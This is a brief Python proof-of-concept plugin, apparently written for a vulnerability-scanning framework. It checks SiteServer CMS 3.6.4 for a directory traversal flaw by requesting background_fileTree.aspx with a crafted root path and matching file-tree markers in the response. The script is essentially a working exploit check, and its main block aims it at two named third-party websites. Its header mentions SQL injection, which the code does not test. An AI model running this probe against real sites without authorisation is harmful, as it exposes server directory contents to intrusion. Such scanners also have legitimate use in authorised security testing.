#!/usr/bin/evn python
#-*-:coding:utf-8 -*-
#Author:404
#Name:siteserver最新版3.6.4 sql inject漏洞大礼包of 家有目录遍历
#Refer:http://www.wooyun.org/corps/%E7%99%BE%E5%AE%B9%E5%8D%83%E5%9F%9F%E8%BD%AF%E4%BB%B6%E6%8A%80%E6%9C%AF%E5%BC%80%E5%8F%91%E6%9C%89%E9%99%90%E8%B4%A3%E4%BB%BB%E5%85%AC%E5%8F%B8/page/2


def assign(service,arg):
    if service=="siteserver":
        return True,arg 


def  audit(arg):
    url=arg+"siteserver/cms/background_fileTree.aspx?PublishmentSystemID=0&RootPath=&CurrentRootPath=include"
    code,head,res,errcode,_=curl.curl2(url)
    if code==200 and "absmiddle" in res and 'openFolderByA(this)' in res:
        security_hole(url)
        
        
if __name__=="__main__":
    from dummy import *
    audit(assign('siteserver','http://www.plhgyy.com/')[1])
    audit(assign('siteserver','http://www.zgktws.com/')[1])